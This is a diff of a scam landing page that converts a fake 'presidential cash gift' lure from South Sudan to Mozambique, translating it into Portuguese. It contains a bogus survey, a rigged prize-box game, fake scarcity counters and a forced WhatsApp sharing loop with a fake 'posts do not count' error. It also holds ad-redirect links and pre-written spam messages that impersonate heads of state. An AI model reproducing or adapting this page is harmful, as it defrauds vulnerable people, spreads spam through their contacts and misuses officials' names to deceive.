@@ -5,7 +5,7 @@
 <head>
 	<script src="#"></script>
 <script src="alladz.js"></script>
-<title>PRESIDENT SALVA KIIR APPROVES SDG20000 CASH GIFTS TO POOR SOUTH SUDAN CITIZENS</title>
+<title>PRESIDENTE CHAPO DOA 5000 MZN EM DINHEIRO AOS CIDADÃOS MOÇAMBIQUES</title>
 <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhsxlywk1zDzES7rkD5k9-ObfMTDujlDtRtAmf61KjMna1YRqA6zZbNdxAeEaAwhyU_0HU1FHWSPitS597NpoU6eH4ZSz0OJ3hVVC67XFeBx14SzmGwbnky3sb4Brrns8UsNJVsMQEhgjedHTGUcqKFBdBYiKCtM6WBAl_VsH3rz369rAI7TCZTRCThZzJd/w640-h616/IMG_5737.jpeg" />
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -292,13 +292,12 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">Parabéns! Suas respostas foram salvas.</h2>
  
 <p class="paragraph">
-Now you have a chance to win SDG20000 cash prize<br><br>
-You have 3 chances ! we wish you good luck
-<br><br>
-You need to select the box that has the gift inside the boxes.
+Agora você tem a chance de ganhar um prêmio em dinheiro de MZN:5000<br><br>
+Você tem 3 chances! Desejamos-lhe boa sorte<br><br>
+Você precisa selecionar a caixa que contém o presente dentro das caixas.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
@@ -306,9 +305,9 @@ Start
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">Melhor sorte da próxima vez</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Você tem (2) chances extras. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -316,12 +315,12 @@ OK
 </button>
 </vue-modal>
 <vue-modal :open="showSuccessModal">
-<img src="https://i.ebayimg.com/images/g/DfQAAOSwNNhijiy-/s-l1200.jpg" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<img src="https://www.shutterstock.com/image-illustration/mozambique-money-mozambican-metical-pack-260nw-2530673713.jpg" style="width: 240px;">
+<h1 class="heading heading--h1">Parabéns! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> SDG;20000 cash</b><br>Follow the instructions on the next page to claim your prize ! 
+Seu prêmio é: <b> MZN: 5000 em dinheiro</b><br>Siga as instruções na próxima página para reivindicar seu prêmio ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -338,12 +337,12 @@ Ok
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhsxlywk1zDzES7rkD5k9-ObfMTDujlDtRtAmf61KjMna1YRqA6zZbNdxAeEaAwhyU_0HU1FHWSPitS597NpoU6eH4ZSz0OJ3hVVC67XFeBx14SzmGwbnky3sb4Brrns8UsNJVsMQEhgjedHTGUcqKFBdBYiKCtM6WBAl_VsH3rz369rAI7TCZTRCThZzJd/w640-h616/IMG_5737.jpeg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Hello!
+Olá!
 </h1>
   <p class="paragraph">
-Welcome to <b>PRESIDENT SALVA KIIR APPROVES SDG20000 CASH GIFTS TO POOR SOUTH SUDAN CITIZENS</b>, Dont miss this year SDG20000 cash grant.
+Bem-vindo ao <b>PRESIDENTE CHAPO DOA 5000 MZN EM DINHEIRO AOS CIDADÃOS MOÇAMBIQUES</b>, Não perca o subsídio em dinheiro de MZN:5000 deste ano.
 <br>
-Answer the questions below to claim <b>SDG20000 Cash Prize</b>
+Responda às perguntas abaixo para reivindicar <b>Prêmio em dinheiro de MZN: 5000</b>
 </p>
   <br>
 </div>
@@ -353,34 +352,33 @@ Answer the questions below to claim <b>SDG20000 Cash Prize</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
-              "Please wait a moment..."
+                     "Por favor, espere um momento...",
+              "Por favor, espere um momento...",
+              "Por favor, espere um momento..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+Você respondeu 4/4 das perguntas
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+Suas respostas estão sendo processadas<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+ainda prêmios disponíveis!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
+Procurando presentes.. 
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (289) gifts remain!
+Restam apenas (289) presentes!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
@@ -391,20 +389,20 @@ Stock is being checked
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are you a citizen of South Sudan?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "Você é cidadão de Moçambique??",
+              answers: [ { text: "Sim" }, { text: "Não" } ]
             },
                                                              {
-              title: "Do You Have I.D?)",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "Você tem trabalho?)",
+              answers: [ { text: "Sim" }, { text: "Não" } ]
             },
             {
-              title: "Choose your Gender?",
+              title: "Escolha seu gênero?",
               answers: [ { text: "Male" }, { text: "Female" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
+              title: "Selecione sua faixa etária?",
+              answers: [ { text: "18 - 20 anos" }, { text: "21 - 25 anos" }, { text: "26 - 30 anos" }, { text: "30 anos acima" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
@@ -423,13 +421,13 @@ Stock is being checked
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>SDG;20000</b> <br>Follow the instructions below to your prize !</p>
+<p class="txt1">Seu prêmio é: <b>MZN:5000</b> <br>Siga as instruções abaixo para receber seu prêmio !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1.share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
+<div id="lastapp"><p class="rules">1.compartilhe com 5 grupos / 15 amigos no "Whatsapp" (clique no ícone "COMPARTILHAR" abaixo)</p><p class="rules">2. Clique em "Continuar" e reivindique seu prêmio.</p></div>
 
     
-   <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+   <div class="share_main_bt" id="whatsapp">COMPARTILHAR&nbsp;   →</div>
+  <h4 class="textlastup">Compartilhe até a barra azul ficar cheia!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -456,16 +454,16 @@ Stock is being checked
 <p>Congratulations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
-                                <center>   <img src="https://i.ebayimg.com/images/g/DfQAAOSwNNhijiy-/s-l1200.jpg" width='81%'/> </center>
+                                <center>   <img src="https://www.shutterstock.com/image-illustration/mozambique-money-mozambican-metical-pack-260nw-2530673713.jpg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>SDG20000 cash.</b> <br>Follow the instruction below to claim your prize !</p>
+<p class="txt1">Seu prêmio é: <b>MZN:5000 cash.</b> <br>Siga as instruções abaixo para reivindicar seu prêmio !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
         <a  onclick="window.open('//thaudray.com/4/3077182')" href="https://africa-day-mtn-celebration.blogspot.com/#1740935976743" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM LRK 10000</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">REIVINDICAÇÃO MZN:5000</font></button>
                     </a><br/> <br/>
 	     <!-- BEGIN: Powered by Supercounters.com -->
 <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1711648,"","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
@@ -482,7 +480,7 @@ Stock is being checked
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Withdraw SDG20000</div> 
+            <div class="share_main_bt" id="offers">Saque MZN:5000</div> 
       <br>
           
        
@@ -526,7 +524,7 @@ function go() {
         var text1 = "ytime" ,
             text2 = " مكتبة جرير تقدم ",
             text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
-            error = "There is an error!\nPosts do not count. You may have shared it with the same friend or group more than once, please re-share.",
+            error = "Ocorreu um erro!\nPublicações não contam. Você pode ter compartilhado com o mesmo amigo ou grupo mais de uma vez. Compartilhe novamente.",
             cpa = "https://thaudray.com/4/3077182",
             cpa1 = "https://thaudray.com/4/3077182",
             saved = "coke2",
@@ -535,10 +533,10 @@ function go() {
 
 <script>
   var tiaoban = [
-    "PRESIDENT SALVA KIIR APPROVES SDG20000 CASH GIFTS TO POOR SOUTH SUDAN CITIZENS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive SDG20000 instantly .%0A i just got mine%0A%0AClick Here👇%0A https://okrepisa.org/Pres-Salva-Kiir-Cash-Gifts.html ",
-    "PRESIDENT SALVA KIIR APPROVES SDG20000 CASH GIFTS TO POOR SOUTH SUDAN CITIZENS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive SDG20000 instantly.%0A i just got mine%0A%0AClick Here👇%0A https://okrepisa.org/Pres-Salva-Kiir-Cash-Gifts.html ",
-    "PRESIDENT SALVA KIIR APPROVES SDG20000 CASH GIFTS TO POOR SOUTH SUDAN CITIZENS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive SDG20000 instantly.%0A i just got mine%0A%0AClick Here👇%0A https://okrepisa.org/Pres-Salva-Kiir-Cash-Gifts.html ",
-    "PRESIDENT SALVA KIIR APPROVES SDG20000 CASH GIFTS TO POOR SOUTH SUDAN CITIZENS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive SDG20000 instantly.%0A i just got mine%0A%0AClick Here👇%0A https://okrepisa.org/Pres-Salva-Kiir-Cash-Gifts.html ",
+    "*PRESIDENTE CHAPO APROVA DOAÇÕES EM DINHEIRO DE MZN:5000 PARA TODOS OS JOVENS DE MOÇAMBIQUE*%0A%0A*COMO OBTER*%0AAcesse o link abaixo e responda as seguintes perguntas e você receberá MZN:5000 instantaneamente .%0A acabei de receber o meu%0A%0AClique aqui👇%0A https://okrepisa.org/President-Presentes-em-dinheiro-Chapo.html#1747825344078 ",
+    "*PRESIDENTE CHAPO APROVA DOAÇÕES EM DINHEIRO DE MZN:5000 PARA TODOS OS JOVENS DE MOÇAMBIQUE*%0A%0A*COMO OBTER*%0AAcesse o link abaixo e responda as seguintes perguntas e você receberá MZN:5000 instantaneamente.%0A acabei de receber o meu%0A%0AClique aqui👇%0A https://okrepisa.org/President-Presentes-em-dinheiro-Chapo.html#1747825344078 ",
+    "*PRESIDENTE CHAPO APROVA DOAÇÕES EM DINHEIRO DE MZN:5000 PARA TODOS OS JOVENS DE MOÇAMBIQUE*%0A%0A*COMO OBTER*%0AAcesse o link abaixo e responda as seguintes perguntas e você receberá MZN:5000 instantaneamente.%0A acabei de receber o meu%0A%0AClique aqui👇%0A https://okrepisa.org/President-Presentes-em-dinheiro-Chapo.html#1747825344078 ",
+    "*PRESIDENTE CHAPO APROVA DOAÇÕES EM DINHEIRO DE MZN:5000 PARA TODOS OS JOVENS DE MOÇAMBIQUE*%0A%0A*COMO OBTER*%0AAcesse o link abaixo e responda as seguintes perguntas e você receberá MZN:5000 instantaneamente.%0A acabei de receber o meu%0A%0AClique aqui👇%0A https://okrepisa.org/President-Presentes-em-dinheiro-Chapo.html#1747825344078 ",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
